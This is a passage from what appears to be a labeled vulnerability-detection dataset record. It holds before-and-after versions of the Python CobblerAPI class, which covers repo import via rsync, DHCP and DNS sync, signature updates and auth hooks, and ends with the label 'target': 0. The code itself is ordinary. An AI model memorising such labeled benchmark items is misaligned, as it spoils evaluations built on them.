included or not.\n        :param collapse: collapse=True specifies returning a dict instead of objects.\n        :return: The list of distros which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.distros, collapse=collapse)\n\n    def get_profiles_since(self, mtime: float, collapse: bool = False) -> list:\n        \"\"\"\n        Returns profiles modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: If True then this specifies that a list of dicts should be returned instead of a list of\n                         objects.\n        :return: The list of profiles which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.profiles, collapse=collapse)\n\n    def get_systems_since(self, mtime: float, collapse: bool = False) -> list:\n        \"\"\"\n        Return systems modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: If True then this specifies that a list of dicts should be returned instead of a list of\n                         objects.\n        :return: The list of systems which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.systems, collapse=collapse)\n\n    def get_repos_since(self, mtime: float, collapse: bool = False) -> list:\n        \"\"\"\n        Return repositories modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: If True then this specifies that a list of dicts should be returned instead of a list of\n                         objects.\n        :return: The list of repositories which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.repos, collapse=collapse)\n\n    def get_images_since(self, mtime: float, collapse: bool = False) -> list:\n        \"\"\"\n        Return images modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: If True then this specifies that a list of dicts should be returned instead of a list of\n                         objects.\n        :return: The list of images which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.images, collapse=collapse)\n\n    def get_mgmtclasses_since(self, mtime: float, collapse: bool = False) -> list:\n        \"\"\"\n        Return management classes modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: If True then this specifies that a list of dicts should be returned instead of a list of\n                         objects.\n        :return: The list of management classes which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.mgmtclasses, collapse=collapse)\n\n    def get_packages_since(self, mtime: float, collapse: bool = False) -> list:\n        \"\"\"\n        Return packages modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: If True then this specifies that a list of dicts should be returned instead of a list of\n                         objects.\n        :return: The list of packages which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.packages, collapse=collapse)\n\n    def get_files_since(self, mtime: float, collapse: bool = False) -> list:\n        \"\"\"\n        Return files modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: If True then this specifies that a list of dicts should be returned instead of a list of\n                         objects.\n        :return: The list of files which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.files, collapse=collapse)\n\n    def get_menus_since(self, mtime: float, collapse=False) -> list:\n        \"\"\"\n        Return files modified since a certain time (in seconds since Epoch)\n\n        :param mtime: The timestamp which marks the gate if an object is included or not.\n        :param collapse: If True then this specifies that a list of dicts should be returned instead of a list of\n                         objects.\n        :return: The list of files which are newer then the given timestamp.\n        \"\"\"\n        return self.__since(mtime, self.menus, collapse=collapse)\n\n    # ==========================================================================\n\n    def get_signatures(self) -> dict:\n        \"\"\"\n        This returns the local signature cache.\n\n        :return: The dict containing all signatures.\n        \"\"\"\n        return utils.SIGNATURE_CACHE\n\n    def signature_update(self):\n        \"\"\"\n        Update all signatures from the URL specified in the settings.\n        \"\"\"\n        try:\n            url = self.settings().signature_url\n            dlmgr = download_manager.DownloadManager(self._collection_mgr)\n            # write temp json file\n            tmpfile = tempfile.NamedTemporaryFile()\n            sigjson = dlmgr.urlread(url)\n            tmpfile.write(sigjson.text.encode())\n            tmpfile.flush()\n            self.logger.debug(\"Successfully got file from %s\" % self.settings().signature_url)\n            # test the import without caching it\n            try:\n                utils.load_signatures(tmpfile.name, cache=False)\n            except:\n                self.logger.error(\"Downloaded signatures failed test load (tempfile = %s)\", tmpfile.name)\n\n            # rewrite the real signature file and import it for real\n            f = open(self.settings().signature_path, \"w\")\n            f.write(sigjson.text)\n            f.close()\n\n            utils.load_signatures(self.settings().signature_path)\n        except:\n            utils.log_exc()\n\n    # ==========================================================================\n\n    def dump_vars(self, obj, formatted_output: bool = False):\n        \"\"\"\n        Dump all known variables related to that object.\n\n        :param obj: The object for which the variables should be dumped.\n        :param formatted_output: If True the values will align in one column and be pretty printed for cli example.\n        :return: A dictionary with all the information which could be collected.\n        \"\"\"\n        return obj.dump_vars(formatted_output)\n\n    # ==========================================================================\n\n    def auto_add_repos(self):\n        \"\"\"\n        Import any repos this server knows about and mirror them. Run ``cobbler reposync`` to apply the changes.\n        Credit: Seth Vidal.\n\n        :raises ImportError\n        \"\"\"\n        self.log(\"auto_add_repos\")\n        try:\n            import dnf\n        except:\n            raise ImportError(\"dnf is not installed\")\n\n        base = dnf.Base()\n        base.read_all_repos()\n        basearch = base.conf.substitutions[\"basearch\"]\n\n        for repository in base.repos.iter_enabled():\n            auto_name = repository.id + '-' + base.conf.releasever + '-' + basearch\n\n            if self.find_repo(auto_name) is None:\n                cobbler_repo = self.new_repo()\n                cobbler_repo.name = auto_name\n                cobbler_repo.breed = enums.RepoBreeds.YUM\n                cobbler_repo.arch = basearch\n                cobbler_repo.comment = repository.name\n                baseurl = repository.baseurl\n                metalink = repository.metalink\n                mirrorlist = repository.mirrorlist\n\n                if metalink is not None:\n                    mirror = metalink\n                    mirror_type = enums.MirrorType.METALINK\n                elif mirrorlist is not None:\n                    mirror = mirrorlist\n                    mirror_type = enums.MirrorType.MIRRORLIST\n                elif len(baseurl) > 0:\n                    mirror = baseurl[0]\n                    mirror_type = enums.MirrorType.BASEURL\n                else:\n                    mirror = \"\"\n                    mirror_type = enums.MirrorType.NONE\n\n                cobbler_repo.mirror = mirror\n                cobbler_repo.mirror_type = mirror_type\n                self.log(\"auto repo adding: %s\" % auto_name)\n                self.add_repo(cobbler_repo)\n            else:\n                self.log(\"auto repo adding: %s - exists\" % auto_name)\n\n    # ==========================================================================\n\n    def get_repo_config_for_profile(self, obj) -> str:\n        \"\"\"\n        Get the repository configuration for the specified profile\n\n        :param obj: The profile to return the configuration for.\n        :return: The repository configuration as a string.\n        \"\"\"\n        return self.yumgen.get_yum_config(obj, True)\n\n    def get_repo_config_for_system(self, obj) -> str:\n        \"\"\"\n        Get the repository configuration for the specified system.\n\n        :param obj: The system to return the configuration for.\n        :return: The repository configuration as a string.\n        \"\"\"\n        return self.yumgen.get_yum_config(obj, False)\n\n    # ==========================================================================\n\n    def get_template_file_for_profile(self, obj, path) -> str:\n        \"\"\"\n        Get the template for the specified profile.\n\n        :param obj: The object which is related to that template.\n        :param path: The path to the template.\n        :return: The template as in its string representation.\n        \"\"\"\n        template_results = self.tftpgen.write_templates(obj, False, path)\n        if path in template_results:\n            return template_results[path]\n        else:\n            return \"# template path not found for specified profile\"\n\n    def get_template_file_for_system(self, obj, path):\n        \"\"\"\n        Get the template for the specified system.\n\n        :param obj: The object which is related to that template.\n        :param path: The path to the template.\n        :return: The template as in its string representation.\n        \"\"\"\n        template_results = self.tftpgen.write_templates(obj, False, path)\n        if path in template_results:\n            return template_results[path]\n        else:\n            return \"# template path not found for specified system\"\n\n    # ==========================================================================\n\n    def generate_ipxe(self, profile: str, image: str, system: str) -> str:\n        \"\"\"\n        Generate the ipxe configuration files. The system wins over the profile. Profile and System win over Image.\n\n        :param profile: The profile to return the configuration for.\n        :param image: The image to return the configuration for.\n        :param system: The system to return the configuration for.\n        :return: The generated configuration file.\n        \"\"\"\n        self.log(\"generate_ipxe\")\n        data = \"\"\n        if profile is None and image is None and system is None:\n            boot_menu = self.tftpgen.make_pxe_menu()\n            if 'ipxe' in boot_menu:\n                data = boot_menu['ipxe']\n        elif system:\n            data = self.tftpgen.generate_ipxe(\"system\", system)\n        elif profile:\n            data = self.tftpgen.generate_ipxe(\"profile\", profile)\n        elif image:\n            data = self.tftpgen.generate_ipxe(\"image\", image)\n        return data\n\n    # ==========================================================================\n\n    def generate_bootcfg(self, profile: str, system: str) -> str:\n        \"\"\"\n        Generate a boot configuration. The system wins over the profile.\n\n        :param profile: The profile to return the configuration for.\n        :param system: The system to return the configuration for.\n        :return: The generated configuration file.\n        \"\"\"\n        self.log(\"generate_bootcfg\")\n        if system:\n            return self.tftpgen.generate_bootcfg(\"system\", system)\n        else:\n            return self.tftpgen.generate_bootcfg(\"profile\", profile)\n\n    # ==========================================================================\n\n    def generate_script(self, profile: Optional[str], system: Optional[str], name: str):\n        \"\"\"\n        Generate an autoinstall script for the specified profile or system. The system wins over the profile.\n\n        :param profile: The profile name to generate the script for.\n        :param system: The system name to generate the script for.\n        :param name: The name of the script which should be generated. Must only contain alphanumeric characters, dots\n                     and underscores.\n        :return: The generated script or an error message.\n        \"\"\"\n        self.log(\"generate_script\")\n        if system:\n            return self.tftpgen.generate_script(\"system\", system, name)\n        else:\n            return self.tftpgen.generate_script(\"profile\", profile, name)\n\n    # ==========================================================================\n\n    def check(self) -> Union[None, list]:\n        \"\"\"\n        See if all preqs for network booting are valid. This returns a list of strings containing instructions on things\n        to correct. An empty list means there is nothing to correct, but that still doesn't mean there are configuration\n        errors. This is mainly useful for human admins, who may, for instance, forget to properly set up their TFTP\n        servers for PXE, etc.\n\n        :return: None or a list of things to address.\n        \"\"\"\n        self.log(\"check\")\n        action_check = check.CobblerCheck(self._collection_mgr)\n        return action_check.run()\n\n    # ==========================================================================\n\n    def validate_autoinstall_files(self):\n        \"\"\"\n        Validate if any of the autoinstallation files are invalid and if yes report this.\n\n        \"\"\"\n        self.log(\"validate_autoinstall_files\")\n        autoinstall_mgr = autoinstall_manager.AutoInstallationManager(self._collection_mgr)\n        autoinstall_mgr.validate_autoinstall_files()\n\n    # ==========================================================================\n\n    def sync_systems(self, systems: List[str], verbose: bool = False):\n        \"\"\"\n        Take the values currently written to the configuration files in /etc, and /var, and build out the information\n        tree found in /tftpboot. Any operations done in the API that have not been saved with serialize() will NOT be\n        synchronized with this command.\n\n        :param systems: List of specified systems that needs to be synced\n        :param verbose: If the action should be just logged as needed or (if True) as much verbose as possible.\n        \"\"\"\n        self.log(\"sync_systems\")\n        if not (systems and isinstance(systems, list) and all(isinstance(sys_name, str) for sys_name in systems)):\n            raise TypeError('Systems must be a list of one or more strings.')\n        sync_obj = self.get_sync(verbose=verbose)\n        sync_obj.run_sync_systems(systems)\n\n    # ==========================================================================\n\n    def sync(self, verbose: bool = False, what: Optional[list] = None):\n        \"\"\"\n        Take the values currently written to the configuration files in /etc, and /var, and build out the information\n        tree found in /tftpboot. Any operations done in the API that have not been saved with serialize() will NOT be\n        synchronized with this command.\n\n        :param verbose: If the action should be just logged as needed or (if True) as much verbose as possible.\n        :param what:   List of strings what services to sync (e.g. dhcp and/or dns). Empty list for full sync.\n        \"\"\"\n        # Empty what: Full sync\n        if not what:\n            self.logger.info(\"syncing all\")\n            sync_obj = self.get_sync(verbose=verbose)\n            sync_obj.run()\n            return\n        # Non empty what: Specific sync\n        if not isinstance(what, list):\n            raise TypeError(\"'what' needs to be of type list!\")\n        if 'dhcp' in what:\n            self.sync_dhcp()\n        if 'dns' in what:\n            self.sync_dns()\n\n    # ==========================================================================\n\n    def sync_dns(self):\n        \"\"\"\n        Only build out the DNS configuration.\n        \"\"\"\n        if not self.settings().manage_dns:\n            self.logger.error(\"manage_dns not set\")\n            return\n        self.logger.info(\"sync_dns\")\n        dns_module = self.get_module_from_file(\n            \"dns\",\n            \"module\",\n            \"managers.bind\"\n        )\n        dns = dns_module.get_manager(self._collection_mgr)\n        dns.sync()\n\n    # ==========================================================================\n\n    def sync_dhcp(self):\n        \"\"\"\n        Only build out the DHCP configuration.\n        \"\"\"\n        if not self.settings().manage_dhcp:\n            self.logger.error(\"manage_dhcp not set\")\n            return\n        self.logger.info(\"sync_dhcp\")\n        dhcp_module = self.get_module_from_file(\n            \"dhcp\",\n            \"module\",\n            \"managers.isc\"\n        )\n        dhcp = dhcp_module.get_manager(self._collection_mgr)\n        dhcp.sync()\n\n    # ==========================================================================\n\n    def get_sync(self, verbose: bool = False):\n        \"\"\"\n        Get a Cobbler Sync object which may be executed through the call of ``obj.run()``.\n\n        :param verbose: If the action should be just logged as needed or (if True) as much verbose as possible.\n        :return: An instance of the CobblerSync class to execute the sync with.\n        \"\"\"\n        if not isinstance(verbose, bool):\n            raise TypeError(\"get_sync: verbose parameter needs to be of type bool!\")\n        dhcp = self.get_module_from_file(\n            \"dhcp\",\n            \"module\",\n            \"managers.isc\"\n        ).get_manager(self._collection_mgr)\n        dns = self.get_module_from_file(\n            \"dns\",\n            \"module\",\n            \"managers.bind\"\n        ).get_manager(self._collection_mgr)\n        tftpd = self.get_module_from_file(\n            \"tftpd\",\n            \"module\",\n            \"managers.in_tftpd\",\n        ).get_manager(self._collection_mgr)\n\n        return sync.CobblerSync(self._collection_mgr, dhcp=dhcp, dns=dns, tftpd=tftpd, verbose=verbose)\n\n    # ==========================================================================\n\n    def reposync(self, name: Optional[str] = None, tries: int = 1, nofail: bool = False):\n        \"\"\"\n        Take the contents of ``/var/lib/cobbler/repos`` and update them -- or create the initial copy if no contents\n        exist yet.\n\n        :param name: The name of the repository to run reposync for.\n        :param tries: How many tries should be executed before the action fails.\n        :param nofail: If True then the action will fail, otherwise the action will just be skipped. This respects the\n                       ``tries`` parameter.\n        \"\"\"\n        self.log(\"reposync\", [name])\n        action_reposync = reposync.RepoSync(self._collection_mgr, tries=tries, nofail=nofail)\n        action_reposync.run(name)\n\n    # ==========================================================================\n\n    def status(self, mode: str):\n        \"\"\"\n        Get the status of the current Cobbler instance.\n\n        :param mode: \"text\" or anything else. Meaning whether the output is thought for the terminal or not.\n        :return: The current status of Cobbler.\n        \"\"\"\n        statusifier = status.CobblerStatusReport(self._collection_mgr, mode)\n        return statusifier.run()\n\n    # ==========================================================================\n\n    def import_tree(self, mirror_url: str, mirror_name: str, network_root=None, autoinstall_file=None, rsync_flags=None,\n                    arch=None, breed=None, os_version=None) -> bool:\n        \"\"\"\n        Automatically import a directory tree full of distribution files.\n\n        :param mirror_url: Can be a string that represents a path, a user@host syntax for SSH, or an rsync:// address.\n                           If mirror_url is a filesystem path and mirroring is not desired, set network_root to\n                           something like \"nfs://path/to/mirror_url/root\"\n        :param mirror_name: The name of the mirror.\n        :param network_root:\n        :param autoinstall_file:\n        :param rsync_flags:\n        :param arch:\n        :param breed:\n        :param os_version:\n        \"\"\"\n        self.log(\"import_tree\", [mirror_url, mirror_name, network_root, autoinstall_file, rsync_flags])\n\n        # Both --path and --name are required arguments.\n        if mirror_url is None or not mirror_url:\n            self.log(\"import failed.  no --path specified\")\n            return False\n        if mirror_name is None or not mirror_name:\n            self.log(\"import failed.  no --name specified\")\n            return False\n\n        path = os.path.normpath(\"%s/distro_mirror/%s\" % (self.settings().webdir, mirror_name))\n        if arch is not None:\n            arch = arch.lower()\n            if arch == \"x86\":\n                # be consistent\n                arch = \"i386\"\n            if path.split(\"-\")[-1] != arch:\n                path += (\"-%s\" % arch)\n\n        # We need to mirror (copy) the files.\n        self.log(\"importing from a network location, running rsync to fetch the files first\")\n\n        utils.mkdir(path)\n\n        # Prevent rsync from creating the directory name twice if we are copying via rsync.\n\n        if not mirror_url.endswith(\"/\"):\n            mirror_url = \"%s/\" % mirror_url\n\n        if mirror_url.startswith(\"http://\") or mirror_url.startswith(\"https://\") or mirror_url.startswith(\"ftp://\") \\\n                or mirror_url.startswith(\"nfs://\"):\n            # HTTP mirrors are kind of primative. rsync is better. That's why this isn't documented in the manpage and\n            # we don't support them.\n            # TODO: how about adding recursive FTP as an option?\n            self.log(\"unsupported protocol\")\n            return False\n        else:\n            # Good, we're going to use rsync.. We don't use SSH for public mirrors and local files.\n            # Presence of user@host syntax means use SSH\n            spacer = \"\"\n            if not mirror_url.startswith(\"rsync://\") and not mirror_url.startswith(\"/\"):\n                spacer = ' -e \"ssh\" '\n            rsync_cmd = RSYNC_CMD\n            if rsync_flags:\n                rsync_cmd += \" \" + rsync_flags\n\n            # If --available-as was specified, limit the files we pull down via rsync to just those that are critical\n            # to detecting what the distro is\n            if network_root is not None:\n                rsync_cmd += \" --include-from=/etc/cobbler/import_rsync_whitelist\"\n\n            # kick off the rsync now\n            utils.run_this(rsync_cmd, (spacer, mirror_url, path))\n\n        if network_root is not None:\n            # In addition to mirroring, we're going to assume the path is available over http, ftp, and nfs, perhaps on\n            # an external filer. Scanning still requires --mirror is a filesystem path, but --available-as marks the\n            # network path. This allows users to point the path at a directory containing just the network boot files\n            # while the rest of the distro files are available somewhere else.\n\n            # Find the filesystem part of the path, after the server bits, as each distro URL needs to be calculated\n            # relative to this.\n\n            if not network_root.endswith(\"/\"):\n                network_root += \"/\"\n            valid_roots = [\"nfs://\", \"ftp://\", \"http://\", \"https://\"]\n            for valid_root in valid_roots:\n                if network_root.startswith(valid_root):\n                    break\n            else:\n                self.log(\"Network root given to --available-as must be nfs://, ftp://, http://, or https://\")\n                return False\n\n            if network_root.startswith(\"nfs://\"):\n                try:\n                    (a, b, rest) = network_root.split(\":\", 3)\n                except:\n                    self.log(\"Network root given to --available-as is missing a colon, please see the manpage example.\")\n                    return False\n\n        import_module = self.get_module_by_name(\"managers.import_signatures\") \\\n            .get_import_manager(self._collection_mgr)\n        import_module.run(path, mirror_name, network_root, autoinstall_file, arch, breed, os_version)\n        return True\n\n    # ==========================================================================\n\n    def acl_config(self, adduser: Optional[str] = None, addgroup: Optional[str] = None,\n                   removeuser: Optional[str] = None, removegroup: Optional[str] = None):\n        \"\"\"\n        Configures users/groups to run the Cobbler CLI as non-root.\n        Pass in only one option at a time. Powers ``cobbler aclconfig``.\n\n        :param adduser:\n        :param addgroup:\n        :param removeuser:\n        :param removegroup:\n        \"\"\"\n        action_acl = acl.AclConfig(self._collection_mgr)\n        action_acl.run(\n            adduser=adduser,\n            addgroup=addgroup,\n            removeuser=removeuser,\n            removegroup=removegroup\n        )\n\n    # ==========================================================================\n\n    def serialize(self):\n        \"\"\"\n        Save the cobbler_collections to disk.\n        Cobbler internal use only.\n        \"\"\"\n        self._collection_mgr.serialize()\n\n    def deserialize(self):\n        \"\"\"\n        Load cobbler_collections from disk.\n        Cobbler internal use only.\n        \"\"\"\n        return self._collection_mgr.deserialize()\n\n    # ==========================================================================\n\n    def get_module_by_name(self, module_name: str):\n        \"\"\"\n        Returns a loaded Cobbler module named 'name', if one exists, else None.\n        Cobbler internal use only.\n\n        :param module_name:\n        :return:\n        \"\"\"\n        return module_loader.get_module_by_name(module_name)\n\n    def get_module_from_file(self, section: str, name: str, fallback: Optional[str] = None):\n        \"\"\"\n        Looks in ``/etc/cobbler/modules.conf`` for a section called 'section' and a key called 'name', and then returns\n        the module that corresponds to the value of that key.\n        Cobbler internal use only.\n\n        :param section:\n        :param name:\n        :param fallback:\n        :return:\n        \"\"\"\n        return module_loader.get_module_from_file(section, name, fallback)\n\n    def get_module_name_from_file(self, section: str, name: str, fallback: Optional[str] = None):\n        \"\"\"\n        Looks up a module the same as ``get_module_from_file`` but returns the module name rather than the module\n        itself.\n\n        :param section:\n        :param name:\n        :param fallback:\n        :return:\n        \"\"\"\n        return module_loader.get_module_name(section, name, fallback)\n\n    def get_modules_in_category(self, category: str):\n        \"\"\"\n        Returns all modules in a given category, for instance \"serializer\", or \"cli\".\n        Cobbler internal use only.\n\n        :param category: The category to check.\n        :return: The list of modules.\n        \"\"\"\n        return module_loader.get_modules_in_category(category)\n\n    # ==========================================================================\n\n    def authenticate(self, user: str, password: str):\n        \"\"\"\n        (Remote) access control. This depends on the chosen authentication module.\n        Cobbler internal use only.\n\n        :param user: The username to check for authentication.\n        :param password: The password to check for authentication.\n        :return: Whether the action succeeded or not.\n        \"\"\"\n        rc = self.authn.authenticate(self, user, password)\n        self.log(\"authenticate\", [user, rc])\n        return rc\n\n    def authorize(self, user: str, resource: str, arg1=None, arg2=None):\n        \"\"\"\n        (Remote) access control. This depends on the chosen authorization module.\n        Cobbler internal use only.\n\n        :param user: The username to check for authorization.\n        :param resource: The type of resource which should be checked for access from the supplied user.\n        :param arg1: The actual resource to check for authorization.\n        :param arg2: Not known what this parameter does exactly.\n        :return: The return code of the action.\n        \"\"\"\n        rc = self.authz.authorize(self, user, resource, arg1, arg2)\n        self.log(\"authorize\", [user, resource, arg1, arg2, rc], debug=True)\n        return rc\n\n    # ==========================================================================\n\n    def build_iso(self, iso=None, profiles=None, systems=None, buildisodir=None, distro=None, standalone=None,\n                  airgapped=None, source=None, exclude_dns=None, xorrisofs_opts=None):\n        \"\"\"\n        Build an iso image which may be network bootable or not.\n\n        :param iso:\n        :param profiles:\n        :param systems:\n        :param buildisodir:\n        :param distro:\n        :param standalone:\n        :param airgapped:\n        :param source:\n        :param exclude_dns:\n        :param xorrisofs_opts:\n        \"\"\"\n        builder = buildiso.BuildIso(self._collection_mgr)\n        builder.run(\n            iso=iso, profiles=profiles, systems=systems, buildisodir=buildisodir, distro=distro, standalone=standalone,\n            airgapped=airgapped, source=source, exclude_dns=exclude_dns, xorrisofs_opts=xorrisofs_opts\n        )\n\n    # ==========================================================================\n\n    def hardlink(self):\n        \"\"\"\n        Hardlink all files where this is possible to improve performance.\n\n        :return: The return code of the subprocess call which actually hardlinks the files.\n        \"\"\"\n        linker = hardlink.HardLinker(api=self)\n        return linker.run()\n\n    # ==========================================================================\n\n    def replicate(self, cobbler_master: Optional[str] = None, port: str = \"80\", distro_patterns: str = \"\",\n                  profile_patterns: str = \"\", system_patterns: str = \"\", repo_patterns: str = \"\",\n                  image_patterns: str = \"\", mgmtclass_patterns=None, package_patterns=None, file_patterns: bool = False,\n                  prune: bool = False, omit_data: bool = False, sync_all: bool = False, use_ssl: bool = False):\n        \"\"\"\n        Pull down data/configs from a remote Cobbler server that is a master to this server.\n\n        :param cobbler_master: The hostname/URL of the other Cobbler server\n        :param port: The port to use for the replication task.\n        :param distro_patterns: The pattern of distros which should be synced.\n        :param profile_patterns: The pattern of profiles which should be synced.\n        :param system_patterns: The pattern of systems which should be synced.\n        :param repo_patterns: The pattern of repositories which should be synced.\n        :param image_patterns: The pattern of images which should be synced.\n        :param mgmtclass_patterns: The pattern of management classes which should be synced.\n        :param package_patterns: The pattern of packages which should be synced.\n        :param file_patterns: The pattern of files which should be synced.\n        :param prune: Whether the object not on the master should be removed or not.\n        :param omit_data: If the data downloaded by the current Cobbler server should be rsynced to the destination\n                          server.\n        :param sync_all: This parameter behaves similarly to a dry run argument. If True then everything will executed,\n                         if False then only some things are synced.\n        :param use_ssl: Whether SSL should be used (True) or not (False).\n        \"\"\"\n        replicator = replicate.Replicate(self._collection_mgr)\n        return replicator.run(\n            cobbler_master=cobbler_master, port=port, distro_patterns=distro_patterns,\n            profile_patterns=profile_patterns, system_patterns=system_patterns, repo_patterns=repo_patterns,\n            image_patterns=image_patterns, mgmtclass_patterns=mgmtclass_patterns, package_patterns=package_patterns,\n            file_patterns=file_patterns, prune=prune, omit_data=omit_data, sync_all=sync_all, use_ssl=use_ssl\n        )\n\n    # ==========================================================================\n\n    def report(self, report_what: Optional[str] = None, report_name: Optional[str] = None,\n               report_type: Optional[str] = None, report_fields: Optional[str] = None,\n               report_noheaders: Optional[bool] = None):\n        \"\"\"\n        Report functionality for Cobbler.\n\n        :param report_what: The object type that should be reported.\n        :param report_name: The name of the object which should be possibly reported.\n        :param report_type: May be either \"text\", \"csv\", \"mediawiki\", \"trac\" or \"doku\".\n        :param report_fields: Specify \"all\" or the fields you want to be reported.\n        :param report_noheaders: If the column headers should be included in the output or not.\n        \"\"\"\n        reporter = report.Report(self._collection_mgr)\n        return reporter.run(report_what=report_what, report_name=report_name, report_type=report_type,\n                            report_fields=report_fields, report_noheaders=report_noheaders)\n\n    # ==========================================================================\n\n    def power_system(self, system: str, power_operation: str, user: Optional[str] = None,\n                     password: Optional[str] = None):\n        \"\"\"\n        Power on / power off / get power status /reboot a system.\n\n        :param system: Cobbler system\n        :param power_operation: power operation. Valid values: on, off, reboot, status\n        :param user: power management user\n        :param password: power management password\n        :return: bool if operation was successful\n        \"\"\"\n\n        if power_operation == \"on\":\n            self.power_mgr.power_on(system, user=user, password=password)\n        elif power_operation == \"off\":\n            self.power_mgr.power_off(system, user=user, password=password)\n        elif power_operation == \"status\":\n            return self.power_mgr.get_power_status(system, user=user, password=password)\n        elif power_operation == \"reboot\":\n            self.power_mgr.reboot(system, user=user, password=password)\n        else:\n            utils.die(\"invalid power operation '%s', expected on/off/status/reboot\" % power_operation)\n        return None\n\n    # ==========================================================================\n\n    def clear_logs(self, system):\n        \"\"\"\n        Clears console and anamon logs for system\n\n        :param system: The system to clear logs of.\n        \"\"\"\n        log.LogTool(self._collection_mgr, system, self).clear()\n\n    # ==========================================================================\n\n    def get_valid_obj_boot_loaders(self, obj) -> List[str]:\n        \"\"\"\n        Return the list of valid boot loaders for the object\n\n        :param obj: The object for which the boot loaders should be looked up.\n        :return: Get a list of all valid boot loaders.\n        \"\"\"\n        return obj.supported_boot_loaders\n\n    # ==========================================================================\n\n    def create_grub_images(self):\n        \"\"\"\n        Create the GRUB installer images via this API call. It utilizes ``grub2-mkimage`` behind the curtain.\n        \"\"\"\n        action = grubimage.GrubImage(self)\n        action.run()", "target": 0}], "function_after": [{"function": "class CobblerAPI:\n    \"\"\"\n    Python API module for Cobbler.\n    See source for cobbler.py, or pydoc, for example usage.\n    Cli apps and daemons should import api.py, and no other Cobbler code.\n    \"\"\"\n    __shared_state = {}\n    __has_loaded = False\n\n    def __init__(self, is_cobblerd: bool = False, settingsfile_location: str = \"/etc/cobbler/settings.yaml\",\n                 execute_settings_automigration: bool = True):\n        \"\"\"\n        Constructor\n\n        :param is_cobblerd: Wether this API is run as a daemon or not.\n        :param settingsfile_location: The location of the settings file on the disk.\n        \"\"\"\n\n        # FIXME: this should be switchable through some simple system\n\n        self.__dict__ = CobblerAPI.__shared_state\n        self.perms_ok = False\n        if not CobblerAPI.__has_loaded:\n            # NOTE: we do not log all API actions, because a simple CLI invocation may call adds and such to load the\n            # config, which would just fill up the logs, so we'll do that logging at CLI level (and remote.py web\n            # service level) instead.\n\n            random.seed()\n            self.is_cobblerd = is_cobblerd\n            if is_cobblerd:\n                main_thread = threading.main_thread()\n                main_thread.setName(\"Daemon\")\n\n            self.logger = logging.getLogger()\n\n            # FIXME: consolidate into 1 server instance\n\n            self.selinux_enabled = utils.is_selinux_enabled()\n            self.dist, self.os_version = utils.os_release()\n            self._settings = self.__generate_settings(pathlib.Path(settingsfile_location),\n                                                      execute_settings_automigration)\n\n            CobblerAPI.__has_loaded = True\n\n            # load the modules first, or nothing else works...\n            module_loader.load_modules()\n\n            # import signatures\n            try:\n                utils.load_signatures(self.settings().signature_path)\n            except Exception as e:\n                self.log(\"Failed to load signatures from %s: %s\" % (self.settings().signature_path, e))\n                return\n\n            self._collection_mgr = manager.CollectionManager(self)\n            self.deserialize()\n\n            self.log(\"%d breeds and %d OS versions read from the signature file\"\n                     % (len(utils.get_valid_breeds()), len(utils.get_valid_os_versions())))\n\n            self.authn = self.get_module_from_file(\n                \"authentication\",\n                \"module\",\n                \"authn_configfile\"\n            )\n            self.authz = self.get_module_from_file(\n                \"authorization\",\n                \"module\",\n                \"authz_allowall\"\n            )\n\n            # FIXME: pass more loggers around, and also see that those using things via tasks construct their own\n            #  yumgen/tftpgen versus reusing this one, which has the wrong logger (most likely) for background tasks.\n\n            self.autoinstallgen = autoinstallgen.AutoInstallationGen(self._collection_mgr)\n            self.yumgen = yumgen.YumGen(self._collection_mgr)\n            self.tftpgen = tftpgen.TFTPGen(self._collection_mgr)\n            self.power_mgr = power_manager.PowerManager(self, self._collection_mgr)\n            self.logger.debug(\"API handle initialized\")\n            self.perms_ok = True\n\n    def __generate_settings(self, settings_path: Path,\n                            execute_settings_automigration: bool = True) -> settings.Settings:\n        # Read in YAML file and get dict\n        yaml_dict = settings.read_yaml_file(settings_path)\n\n        # Add or update auto migrate settings value\n        yaml_dict[\"auto_migrate_settings\"] = execute_settings_automigration\n\n        # Take dict and use it in migrations\n        migrated_settings = settings.migrate(yaml_dict, settings_path)\n\n        # After the migration is done, save result in the settings object\n        new_settings = settings.Settings()\n        new_settings.from_dict(migrated_settings)\n\n        # save to disk\n        new_settings.save(settings_path)\n\n        # Return object\n        return new_settings\n\n    # ==========================================================\n\n    def is_selinux_enabled(self) -> bool:\n        \"\"\"\n        Returns whether selinux is enabled on the Cobbler server.\n        We check this just once at Cobbler API init time, because a restart is required to change this; this does\n        /not/ check enforce/permissive, nor does it need to.\n        \"\"\"\n        return self.selinux_enabled\n\n    def is_selinux_supported(self) -> bool:\n        \"\"\"\n        Returns whether or not the OS is sufficient enough to run with SELinux enabled (currently EL 5 or later).\n\n        :returns: False per default. If Distro is Redhat and Version >= 5 then it returns true.\n        \"\"\"\n        # FIXME: This detection is flawed. There is more than just Rhel with selinux and the original implementation was\n        #        too broad.\n        if (\"red hat\" in self.dist or \"redhat\" in self.dist) and self.os_version >= 5:\n            return True\n        # doesn't support public_content_t\n        return False\n\n    # ==========================================================\n\n    def last_modified_time(self) -> float:\n        \"\"\"\n        Returns the time of the last modification to Cobbler, made by any API instance, regardless of the serializer\n        type.\n\n        :returns: 0 if there is no file where the information required for this method is saved.\n        \"\"\"\n        # FIXME: This fails in case the file required is not available\n        if not os.path.exists(\"/var/lib/cobbler/.mtime\"):\n            fd = open(\"/var/lib/cobbler/.mtime\", 'w')\n            fd.write(\"0\")\n            fd.close()\n            return float(0)\n        fd = open(\"/var/lib/cobbler/.mtime\", 